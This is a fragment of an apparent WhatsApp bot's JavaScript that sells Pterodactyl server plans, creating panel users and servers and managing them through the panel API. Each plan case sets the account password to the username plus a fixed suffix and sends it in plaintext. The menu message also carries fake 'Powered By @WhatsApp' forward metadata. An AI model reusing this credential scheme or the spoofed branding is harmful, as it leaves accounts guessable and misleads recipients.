Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "50"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "2gb": {
    if (!isPrem) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "70"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "3gb": {
    if (!isPrem) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "100"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return kalzx(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}
break
case "4gb": {
        if (!isPrem) return kalzx(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)

let t = text.split(',');
if (t.length < 2) return kalzx(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "125"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "5gb": {
    if (!isPrem) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "150"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "6gb": {
if (!isPrem) return reply(`*maaf kamu tidak diizinkan untuk membuat panel saat ini`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "175"
let disk = "6000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "7gb": {
if (!isPrem) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "175"
let disk = "7000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "unli": {
       if (!isPrem) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "8gb": {
if (!isPrem) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "200"
let disk = "8000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "ramlist":

lrm = `RAM YANG TERSEDIA :
1GB ✅
2GB ✅
3GB ✅
4GB ✅
5GB ✅
6GB ✅️
7GB ✅️
8GB ✅️
UNLI (KHUSUS ADMIN SERVER)`
kalz.sendMessage(from, {text : lrm}, {quoted : fcall})
break 
case 'panel': {
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username2 = t[0];
let u2 = t[1];

let sections = [{
title: 'Menu KalzxBot',
highlight_label: 'Recomended 🔥',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.unli ${username2},${u2}`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.1gb ${username2},${u2}`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.2gb ${username2},${u2}`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.3gb ${username2},${u2}`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.4gb ${username2},${u2}`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.5gb ${username2},${u2}`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.6gb ${username2},${u2}`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.7gb ${username2},${u2}`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.8gb ${username2},${u2}`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By @WhatsApp', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kalz.decodeJid(kalz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Please choose the size you want to buy`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${sender.split("@")[0]} 👋*`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" } }, { upload: kalz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'reinstall': {
if (!isCreator) return reply(mess.owner)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break
case "detusr": {
if (!isCreator) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)
let usr = args[0]
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
let u = res.attributes
reply(`*${u.username.toUpperCase()} USER DETAILS*

\`\`\`ID: ${u.id}
UUID: ${u.uuid}
USERNAME: ${u.username}
EMAIL: ${u.email}
NAME: ${u.first_name} ${u.last_name}
LANGUAGE: ${u.language}
ADMIN: ${u.root_admin}
CREATED AT: ${u.created_at}\`\`\``)
}
break
case 'updatesrv': {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 4) return reply(`*Format salah*

Penggunaan: 
${prefix + command} srvId,locId,memory/disk,cpu`)
let srv = t[0];
let loc = t[1];
let memo_disk = t[2].split`/`;
let cpu = t[3];
let f1 = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json()

let f = await fetch(domain + "/api/application/servers/" + srv + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"allocation": parseInt(loc) || data.attributes.allocation,
"memory": memo_disk[0] || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": memo_disk[1] || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": 5,
"allocations": 5,
"backups": 5
}
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${tanggal2}
UPDATED AT: ${server.updated_at}`)
}
break
case "listsrv": {
  if (!isCreator) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
